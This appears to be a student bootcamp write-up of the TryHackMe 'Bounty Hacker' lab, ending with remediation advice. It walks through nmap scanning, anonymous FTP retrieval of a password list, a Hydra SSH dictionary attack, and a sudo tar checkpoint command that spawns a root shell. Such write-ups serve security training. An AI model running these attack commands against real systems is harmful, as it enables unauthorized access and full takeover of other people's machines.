# TryHackMe — Bounty Hacker

**Penetration Testing Walkthrough | Ironhack Cybersecurity Bootcamp**

**Created by Tiago Santos & Valeria Mosquera Díaz**

[![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red)](https://tryhackme.com/room/cowboyhacker)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Target](https://img.shields.io/badge/Target-Linux-blue)
![Status](https://img.shields.io/badge/Lab-Root%20Access%20Achieved-success)

## Project Overview

This project documents our penetration test of **Bounty Hacker**, a Linux-based boot-to-root challenge on [TryHackMe](https://tryhackme.com/room/cowboyhacker).

Our objective was to identify exposed services, gain access to the target system and escalate privileges to **root**. The lab demonstrates how three common security weaknesses can be chained together: **anonymous FTP access**, **exposed password candidates**, and **excessive sudo permissions**.

All testing was performed in an **authorized TryHackMe lab environment**.

## Project Documents

- **[Technical Penetration Testing Report (DOCX)](./Bounty_Hacker_Technical_Writeup_Valeria_Tiago.docx)** — Detailed analysis, attack methodology and remediation.
- **[Step-by-Step Walkthrough (PDF)](./TryHackMe%20Bounty%20Hacker%20Walkthrough.pdf)** — Presentation with terminal screenshots and key findings.

## Tools and Skills

| Tool | Purpose |
| --- | --- |
| **Nmap** | Port scanning and service enumeration |
| **FTP client** | Anonymous access and file retrieval |
| **Hydra** | Dictionary-based SSH password testing |
| **SSH** | Remote access with recovered credentials |
| **Linux commands / sudo** | Local enumeration and privilege escalation |
| **GTFOBins** | Reference for abusing permitted `tar` functionality |

## Attack Path

```text
Nmap reconnaissance
       |
       v
Anonymous FTP access
       |
       v
Download task.txt + locks.txt
       |
       v
Identify user "lin" + password candidates
       |
       v
Hydra SSH dictionary attack
       |
       v
SSH access as lin -> user.txt
       |
       v
sudo -l -> (root) /bin/tar
       |
       v
tar checkpoint execution -> root shell
```

## 1. Reconnaissance

We started by identifying open ports and running Nmap's default scripts and service-version detection.

```bash
nmap -sC -sV <TARGET_IP>
```

| Port | Service | Version observed |
| --- | --- | --- |
| **21/tcp** | FTP | vsftpd 3.0.5 |
| **22/tcp** | SSH | OpenSSH 8.2p1 |
| **80/tcp** | HTTP | Apache httpd 2.4.41 |

**Key finding:** Nmap's `ftp-anon` check reported that anonymous FTP login was permitted.

## 2. FTP Enumeration

We connected with the `anonymous` account and inspected the files exposed by the server.

```bash
ftp <TARGET_IP>       # Connect to FTP; log in as anonymous
ls                    # List available files
get task.txt          # Download the task list
get locks.txt         # Download password candidates
bye                   # Close the FTP session
cat task.txt          # Read the task list
cat locks.txt         # Inspect the password list
```

**Findings:**
- `task.txt` identified the username **lin**.
- `locks.txt` provided a targeted list of possible passwords.

The exposed files gave us everything needed to test SSH authentication without relying on a large generic wordlist.

## 3. Initial Access — SSH

We used Hydra to test the candidate passwords against the SSH service, then connected using the credentials recovered in the lab.

```bash
hydra -l lin -P locks.txt ssh://<TARGET_IP>  # Test the supplied password list against SSH
ssh lin@<TARGET_IP>                          # Log in as lin
whoami                                       # Confirm current user
ls -la                                       # Inspect the working directory
cat ~/Desktop/user.txt                       # Read the user flag
```

**Result:** Hydra identified one valid credential pair, and we obtained an interactive SSH session as **lin**.

## 4. Privilege Escalation — sudo tar

We checked which commands `lin` could run with elevated privileges.

```bash
sudo -l      # List permitted sudo commands
```

The output included:

```text
(root) /bin/tar
```

Because `tar` was permitted to run as root, its checkpoint functionality could execute a shell with elevated privileges.

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
whoami       # Confirm elevated privileges
```

**Result:** The shell returned **root**, confirming successful privilege escalation. This technique is described in [GTFOBins: tar](https://gtfobins.github.io/gtfobins/tar/#sudo).

## Security Findings and Recommendations

| Security weakness | Potential impact | Recommendation |
| --- | --- | --- |
| Anonymous FTP access | Unauthorized users can retrieve exposed files | Disable anonymous access and restrict file permissions |
| Password candidates exposed via FTP | Enables targeted password attacks against SSH | Protect credentials, use unique passwords and prefer SSH keys |
| Unrestricted sudo permission for `tar` | A standard user can obtain root privileges | Follow least privilege; remove unsafe sudo rules |

## Key Takeaways

- **Enumeration matters:** The most useful initial finding was anonymous FTP access, not the web service.
- **Small information leaks can have large consequences:** An exposed username and password list enabled SSH access.
- **Sudo permissions require careful review:** Allowing powerful binaries to run as root can provide a direct privilege-escalation path.
- **Attack chains are cumulative:** Multiple configuration weaknesses led to complete root access in the lab.

---

**Developed by Tiago Santos & Valeria Mosquera Díaz**  
**Ironhack Cybersecurity Bootcamp · TryHackMe Bounty Hacker**
